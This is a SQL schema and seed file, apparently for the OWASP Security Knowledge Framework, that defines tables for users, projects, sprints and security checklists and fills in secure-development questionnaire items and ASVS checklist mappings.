--
-- Table structure for table `users`
--
drop table if exists `users`;
CREATE TABLE `users` (
`userID` INTEGER PRIMARY KEY AUTOINCREMENT,
`privilegeID` int(11) NOT NULL,
`userName` varchar(255) NOT NULL UNIQUE,
`email` varchar(255) NOT NULL UNIQUE,
`password` varchar(255) NOT NULL,
`accessToken` int(11) NOT NULL UNIQUE,
`activated` varchar(255),
`access` varchar(255) NOT NULL
);

INSERT OR REPLACE INTO `users` (`userID`, `privilegeID`, `userName`, `password`, `accessToken`, `access`, `activated`, `email`) VALUES (1, 1, "admin", "", "1234", "False", "False", "example@owasp.org");


--
-- Table structure for table `groups`
--
drop table if exists `groups`;
CREATE TABLE `groups` (
`groupID` INTEGER PRIMARY KEY AUTOINCREMENT,
`ownerID` int(11) NOT NULL,
`groupName` varchar(250) NOT NULL,
`timestamp` timestamp
);

INSERT OR REPLACE INTO `groups` (`groupID`, `ownerID`, `groupName`) VALUES (1, 1, "privateGroup");

--
-- Table structure for table `groupmembers`
--
drop table if exists `groupmembers`;
CREATE TABLE `groupmembers` (
`memberID` INTEGER PRIMARY KEY AUTOINCREMENT,
`userID` int(11) NOT NULL,
`groupID` int(11) NOT NULL,
`ownerID` int(11) NOT NULL,
`timestamp` timestamp
);

INSERT OR REPLACE INTO `groupMembers` (`memberID`, `userID`, `groupID`, `ownerID`) VALUES (1, 1, 1, 1);


--
-- Table structure for table `privileges`
--
drop table if exists `privileges`;
CREATE TABLE `privileges` (
`privilegeID` INTEGER PRIMARY KEY AUTOINCREMENT,
`privilege` varchar(255) NOT NULL
);

INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (1, "edit:read:manage:delete");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (2, "edit:read:delete");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (3, "edit:read");
INSERT OR REPLACE INTO `privileges` (`privilegeID`, `privilege`) VALUES (4, "read");

--
-- Table structure for table `kb_items`
--
drop table if exists `kb_items`;
CREATE TABLE `kb_items` (
`kbID` INTEGER PRIMARY KEY AUTOINCREMENT,
`title` varchar(250) NOT NULL,
`content` varchar(250) NOT NULL
);


--
-- Table structure for table `code_items`
--
drop table if exists `code_items`;
CREATE TABLE `code_items` (
`codeID` INTEGER PRIMARY KEY AUTOINCREMENT,
`title` varchar(250) NOT NULL,
`content` varchar(250) NOT NULL,
`code_lang` varchar(250) NOT NULL
);


--
-- Table structure for table `projects`
--
drop table if exists `projects`;
CREATE TABLE `projects` (
`projectID` INTEGER PRIMARY KEY AUTOINCREMENT,
`userID` int(11) NOT NULL,
`groupID` int(11) NOT NULL,
`projectName` varchar(250) NOT NULL,
`projectVersion` varchar(250) NOT NULL,
`projectDesc` text NOT NULL,
`ownerID` int(11) NOT NULL,
`timestamp` timestamp NOT NULL,
`level` int(11) NOT NULL
);


--
-- Table structure for table `project_sprints`
--
drop table if exists `project_sprints`;
CREATE TABLE `project_sprints` (
`sprintID` INTEGER PRIMARY KEY AUTOINCREMENT,
`projectID` int(11) NOT NULL,
`groupID` int(11) NOT NULL,
`sprintName` varchar(250) NOT NULL,
`sprintDesc` varchar(250) NOT NULL
);


--
-- Table structure for table `logs`
--
drop table if exists `logs`;
CREATE TABLE `logs` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`date` varchar(255) NOT NULL,
`time` varchar(255) NOT NULL,
`threat` varchar(255) NOT NULL,
`ip` varchar(255) NOT NULL,
`userID` varchar(255) NOT NULL,
`status` varchar(255) NOT NULL,
`message` varchar(255) NOT NULL
);


--
-- Table structure for table `questions_sprint`
--
drop table if exists `questions_sprint`;
CREATE TABLE `questions_sprint` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`question` varchar(255) NOT NULL
);

INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (1, "Does the sprint implement/changes authentication?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (2, "Does the sprint implement/changes functions that extend the primairy authentication mechanism (re-authentication/password forget/step-up/etc)?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (3, "Does the sprint implement/changes functions that sends parameters in the request body such as i.e POST requests?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (4, "Does the sprint implement/changes functions that send parameters and data over a GET request method?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (5, "Does the sprint implement/changes functions that send parameters and data any request methods other then POST and GET?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (6, "Does the sprint implement/changes functions that use SQL?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (7, "Does the sprint implement/changes functions that use LDAP?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (8, "Does the sprint implement/changes functions that perform system commands?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (9, "Does the sprint implement/changes functions that perform local/remote file inclusion?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (10, "Does the sprint implement/changes functions that uses/parses XML?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (11, "Does the sprint implement/changess functions that reflect user supplied input on the client-side?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (12, "Does the sprint implement/changess functions that use automatic variable binding (ORM)?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (13, "Does the sprint implement/changess WYSIWIG like editors?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (14, "Does the sprint implement/changes JSON?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (15, "Does the sprint implement/changes functionality that stores data in the local/client/session storage?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (16, "Does the sprint implement/changes functionality that needs secure random tokens (password forget link, CSRF, ETC)?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (17, "Does the sprint implement/changes functionality that requires encryption?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (18, "Does the sprint implement/changes functionality which allows users to upload files or other data structures to the application?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (19, "Does the sprint implement/changes functionality which implement/changess functionality that needs to share data 'Cross Origin'?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (20, "Does the sprint implement/changes functionality that contain forwards or redirects?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (21, "Does the sprint implement/changes functionality that are API?");
INSERT OR REPLACE INTO `questions_sprint` (`id`, `question`) VALUES (22, "Does the sprint implement/changes functionality that are mobile (native, xamarin, corona, etc)?");


--
-- Table structure for table `questions_pre`
--
drop table if exists `questions_pre`;
CREATE TABLE `questions_pre` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`question` varchar(255) NOT NULL
);

INSERT OR REPLACE INTO `questions_pre` (`id`, `question`) VALUES (1, "You have a blueprint for the design, architecture and validated this using ASVS?");
INSERT OR REPLACE INTO `questions_pre` (`id`, `question`) VALUES (2, "You have a blueprint for performing secure configuration, hardening of the application server and validated this using ASVS?");
INSERT OR REPLACE INTO `questions_pre` (`id`, `question`) VALUES (3, "You have a central Single Sign On service and validated this service using ASVS?");
INSERT OR REPLACE INTO `questions_pre` (`id`, `question`) VALUES (4, "You have a central Identity Management System service and validated this service using ASVS?");


--
-- Table structure for table `checklists`
--
drop table if exists `checklists`;
CREATE TABLE `checklists` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`checklistID` varchar(255),
`content` varchar(255) NOT NULL,
`level` int(11),
`kbID` int(11)
);


--
-- Table structure for table `question_sprint_results`
--
drop table if exists `question_sprint_results`;
CREATE TABLE `question_sprint_results` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`projectID` int(11) NOT NULL,
`sprintID` int(11) NOT NULL,
`question_sprint_ID` int(11) NOT NULL,
`result` boolean
);
 

--
-- Table structure for table `question_pre_results`
--
drop table if exists `question_pre_results`;
CREATE TABLE `question_pre_results` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`projectID` int(11) NOT NULL,
`question_pre_ID` int(11) NOT NULL,
`result` boolean
);

--
-- Table structure for table `checklists_results`
--
drop table if exists `checklists_results`;
CREATE TABLE `checklists_results` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`checklistID` varchar(255) NOT NULL,
`projectID` int(11) NOT NULL,
`sprintID` int(11) NOT NULL,
`status` int(11) NOT NULL,
`preItem` int(11) NOT NULL,
`kbID` int(11)
);

--
-- Table structure for table `checklists_post`
--
drop table if exists `checklists_post`;
CREATE TABLE `checklists_post` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`checklistID` varchar(255) NOT NULL,
`projectID` int(11) NOT NULL,
`sprintID` int(11) NOT NULL,
`status` int(11) NOT NULL,
`kbID` int(11)
);

--
-- Table structure for table `comments`
--
drop table if exists `comments`;
CREATE TABLE `comments` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`sprintID` int(11) NOT NULL,
`checklistID` varchar(255) NOT NULL,
`userID` int(11) NOT NULL, 
`status` int(11) NOT NULL, 	
`comment` varchar(255),
`date` varchar(255) NOT NULL
);

--
-- Table structure for table `checklists_kb`
--
drop table if exists `checklists_kb`;
CREATE TABLE `checklists_kb` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT,
`checklistID` varchar(255),
`question_sprint_ID` int(11),
`question_pre_ID` int(11),
`kbID` int(11),
`codeID_php` int(11),
`codeID_asp` int(11),
`codeID_java` int(11),
`codeID_python` int(11),
`include_always` boolean,
`include_first` boolean
); 

--
--ASVS
--
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.9', 0, 1, 185, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.1', 0, 0, 15, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.2', 0, 0, 251, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.3', 0, 0, 83, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.4', 0, 0, 99, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.5', 0, 0, 100, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.6', 0, 0, 257, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.7', 0, 0, 78, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.8', 0, 0, 236, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.9', 0, 0, 134, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.10', 0, 1, 74, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.10', 0, 0, 107, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.11', 0, 0, 256, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.12', 0, 0, 191, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.13', 0, 0, 210, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.1', 0, 0, 140, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.2', 0, 0, 261, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.3', 3, 0, 72, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.3', 4, 0, 72, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.3', 5, 0, 72, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.4', 0, 0, 19, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.5', 0, 0, 145, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('1.11', 0, 1, 208, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.6', 0, 0, 135, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.7', 0, 0, 142, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.8', 0, 0, 125, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.9', 0, 0, 190, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.10', 0, 0, 235, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('9.11', 0, 0, 135, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.1', 0, 0, 101, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.3', 0, 0, 244, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.4', 0, 0, 103, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.5', 0, 0, 139, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.6', 0, 0, 84, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.8', 0, 0, 127, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.10', 0, 0, 168, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.11', 0, 0, 192, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.12', 0, 0, 255, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.13', 0, 0, 170, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.14', 0, 0, 139, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.15', 0, 0, 198, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('10.16', 0, 0, 247, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.1', 0, 3, 45, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.1', 3, 2, 129, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.1', 4, 2, 129, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.1', 5, 2, 129, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.2', 0, 2, 104, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.3', 0, 2, 131, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.4', 0, 2, 20, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.5', 0, 2, 130, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.6', 14, 2, 193, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.7', 0, 2, 178, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('11.8', 0, 2, 21, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('13.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('2.2', 1, 3, 113, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('13.1', 0, 2, 239, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('13.2', 0, 2, 105, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('15.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('15.1', 0, 0, 110, 0, 0, 0, 0, 'True', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('15.2', 0, 0, 125, 0, 0, 0, 0, 'False', 'True');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.0', 0, 0, 0, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.1', 20, 0, 67, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.2', 8, 0, 225, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.3', 18, 0, 226, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('16.4', 9, 0, 250, 0, 0, 0, 0, 'False', 'False');
